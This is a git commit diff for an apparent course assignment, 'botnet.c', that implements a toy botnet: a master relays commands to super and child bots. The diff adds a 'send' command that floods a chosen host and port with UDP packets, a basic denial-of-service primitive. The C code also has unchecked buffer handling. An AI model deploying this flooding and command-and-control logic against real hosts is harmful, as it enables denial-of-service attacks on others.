338d67085a2905b48987728f33c0d8f6a83eecab
Jongwook Chae <jwchae8@gmail.com>
2016-05-20 01:32:05 -0700

    [PA3]Command Functionality check finished except send

--- pa3/botnet.c
+++ pa3/botnet.c
@@ -2,17 +2,25 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 #include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <netinet/in.h>
 #include <netdb.h>
+#include <fcntl.h>
 
 
 #define MASTER_PORT 2000
 
 void child_bot(int id) {
-    int super_fd;
-    struct sockaddr_in super;
+    int super_fd, file_fd, victim_fd;
+    struct sockaddr_in super, victim;
+    int i, nparam;
     char msg[256];
+    char filename[100];
+    char attack_payload[] = "You are under attack. Zombies under control of botnet are sending you bunch of packets.";
+    char *param, *host, *port;
     if((super_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("Failed to open socket on child bot\n");
         exit(-1);
@@ -26,13 +34,67 @@ void child_bot(int id) {
         exit(-1);
     }
     write(super_fd, "a", 255);
-    while(1);
+    while(1) {
+        read(super_fd, msg, 255);
+        param = strtok(msg, " ");
+        if(!strncmp(param, "show", 4)) {
+            write(super_fd, "show", 255);
+        }
+        else if(!strncmp(param, "search", 6)) {
+            write(super_fd, "search", 255);
+        }
+        else if(!strncmp(param, "date", 4)) {
+            struct tm *tm;
+            time_t t;
+            t = time(NULL);
+            tm = localtime(&t);
+            strftime(msg, 255, "%a %b %d %T %Z %Y", tm);
+            write(super_fd, msg, 255);
+        }
+        else if(!strncmp(param, "host", 4)) {
+            gethostname(msg, 255);
+            write(super_fd, msg, 255);
+        }
+        else if(!strncmp(param, "create", 6)) {
+            param = strtok(NULL, " ");
+            sprintf(filename, "%s_%d", param, id);
+            file_fd = open(filename, O_WRONLY | O_CREAT);
+            close(file_fd);
+            write(super_fd, filename, 255);
+        }
+        else if(!strncmp(param, "send", 4)) {
+            param = strtok(NULL, " ");
+            host = param;
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            port = strchr(param+1, ':');
+            *port = '\0';
+            port = port + 1;
+            if((victim_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+                printf("Socket for sending packet command failed\n");
+                write(super_fd, "fail", 255);
+                continue;
+            }
+            bzero((char *)&victim, sizeof(victim));
+            victim.sin_family = AF_INET;
+            victim.sin_addr.s_addr = inet_addr(host);
+            victim.sin_port = htons(atoi(port));
+            for(i=0; i<nparam; i++) {
+                sendto(victim_fd, attack_payload, strlen(attack_payload), 0, (struct sockaddr*) &victim, sizeof(victim));
+            }
+            write(super_fd, "send", 255);
+        }
+        else {
+            write(super_fd, "fail", 255);
+        }
+    }
 }
 
 void super_bot(int id) {
-    int i, alive;
+    int i, alive, nparam;
     int master_fd, listen_fd, child_fd[8], connect_len;
-    char msg[256];
+    char msg[256], filename[100];
+    char *param;
     struct sockaddr_in master, child;
     if((master_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("Failed to open socket on super bot\n");
@@ -83,19 +145,46 @@ void super_bot(int id) {
     write(master_fd, msg, 255);
     while(1) {
         read(master_fd, msg, 255);
-        if(!strncmp(msg, "show", 4)) {
+        param = strtok(msg, " ");
+        if(!strncmp(param, "show", 4)) {
             for(i=0; i<8; i++) {
                 write(child_fd[i], "show", 255);
                 read(child_fd[i], msg, 255);
             }
         }
-        else if(!strncmp(msg, "search", 6)) {
+        else if(!strncmp(param, "search", 6)) {
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            write(child_fd[(nparam-1) % 8], "search", 255);
+            read(child_fd[(nparam-1) % 8], msg, 255);
+            write(master_fd, param, 255);
         }
-        else if(!strncmp(msg, "read", 4)) {
+        else if(!strncmp(param, "date", 4)) {
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            write(child_fd[(nparam-1) % 8], "date", 255);
+            read(child_fd[(nparam-1) % 8], msg, 255);
+            write(master_fd, msg, 255);
         }
-        else if(!strncmp(msg, "create", 6)) {
+        else if(!strncmp(param, "host", 4)) {
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            write(child_fd[(nparam-1) % 8], "host", 255);
+            read(child_fd[(nparam-1) % 8], msg, 255);
+            write(master_fd, msg, 255);
         }
-        else if(!strncmp(msg, "send", 4)) {
+        else if(!strncmp(param, "create", 6)) {
+            param = strtok(NULL, " ");
+            nparam = atoi(param);
+            param = strtok(NULL, " ");
+            strcpy(msg, "create ");
+            strcat(msg, param);
+            write(child_fd[(nparam-1) % 8], msg, 255);
+            read(child_fd[(nparam-1) % 8], filename, 255);
+            sprintf(msg, "[%d] %s is created\n", nparam, filename);
+            write(master_fd, msg, 255);
+        }
+        else if(!strncmp(param, "send", 4)) {
         }
         else {
             write(master_fd, "I don't know", 255);
@@ -181,7 +270,7 @@ int main() {
                     err = 1;
                     break;
                 }
-                msg = "search ";
+                strcpy(msg, "search ");
                 strcat(msg, param);
                 write(connect_fd[nparam/8], msg, 255);
                 read(connect_fd[nparam/8], msg, 255);
@@ -203,7 +292,7 @@ int main() {
                         err = 1;
                         break;
                     }
-                    msg = "date ";
+                    strcpy(msg, "date ");
                     strcat(msg, param);
                     write(connect_fd[nparam/8], msg, 255);
                     read(connect_fd[nparam/8], msg, 255);
@@ -222,7 +311,7 @@ int main() {
                         err = 1;
                         break;
                     }
-                    msg = "date ";
+                    strcpy(msg, "host ");
                     strcat(msg, param);
                     write(connect_fd[nparam/8], msg, 255);
                     read(connect_fd[nparam/8], msg, 255);
@@ -249,13 +338,13 @@ int main() {
                     err = 1;
                     break;
                 }
-                msg = "create ";
+                strcpy(msg, "create ");
                 strcat(msg, param);
                 strcat(msg, " ");
                 strcat(msg, filename);
                 write(connect_fd[nparam/8], msg, 255);
                 read(connect_fd[nparam/8], msg, 255);
-                printf("[%d] %s_%d is created\n", nparam, filename, nparam);
+                printf("%s\n", msg);
             }
             if(err) {
                 printf("No argument given OR Wrong argument given\n");
@@ -271,7 +360,7 @@ int main() {
                     err = 1;
                     break;
                 }
-                msg = "send ";
+                strcpy(msg, "send ");
                 strcat(msg, param);
                 strcat(msg, " ");
                 strcat(msg, ipport);
